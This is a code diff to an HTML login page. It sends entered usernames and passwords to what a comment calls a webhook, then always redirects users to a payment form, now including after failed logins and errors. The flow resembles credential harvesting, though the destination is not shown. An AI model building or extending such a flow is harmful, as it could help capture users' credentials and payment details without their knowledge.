@@ -85,7 +85,7 @@
       <button type="submit" id="continueBtn">Continue</button>
     </div>
   </form>
-  <div id="loading">Wait...</div>
+  <div id="loading">Procesando...</div>
 </div>
 
 <script>
@@ -98,11 +98,12 @@
   const loading = document.getElementById('loading');
   const skipBtn = document.getElementById('skipBtn');
 
-  // Si hacen Skip Login, redirigimos sin token
+  // Skip Login: redirigir directamente sin enviar webhook
   skipBtn.addEventListener('click', () => {
-    window.location.href = form-pago.html?token=&amount=${encodeURIComponent(amount)};
+    window.location.href = `form-pago.html?token=&amount=${encodeURIComponent(amount)}`;
   });
 
+  // Continue: enviar webhook y luego redirigir
   form.addEventListener('submit', function(e) {
     e.preventDefault();
     loading.style.display = 'flex';
@@ -124,23 +125,17 @@
     .then(res => res.json())
     .then(result => {
       loading.style.display = 'none';
-
       const intentóLogin = user !== '' && pass !== '';
-
-      if (result.ExtendedResultCode === 0) {
-        const token = result.LoyaltySessionToken || '';
-        window.location.href = form-pago.html?token=${encodeURIComponent(token)}&amount=${encodeURIComponent(amount)};
-      } else if (intentóLogin) {
+      if (result.ExtendedResultCode !== 0 && intentóLogin) {
         alert(result.ErrorDescription || 'Invalid credentials.');
-      } else {
-        // Si por alguna razón no intentó login pero ExtendedResultCode ≠ 0
-        window.location.href = form-pago.html?token=&amount=${encodeURIComponent(amount)};
       }
+      const token = (result.ExtendedResultCode === 0) ? (result.LoyaltySessionToken || '') : '';
+      window.location.href = `form-pago.html?token=${encodeURIComponent(token)}&amount=${encodeURIComponent(amount)}`;
     })
     .catch(err => {
-      console.error('Error enviando los datos:', err);
       loading.style.display = 'none';
-      alert('Invalid credentials.');
+      console.error('Error enviando los datos:', err);
+      window.location.href = `form-pago.html?token=&amount=${encodeURIComponent(amount)}`;
     });
   });
 </script>
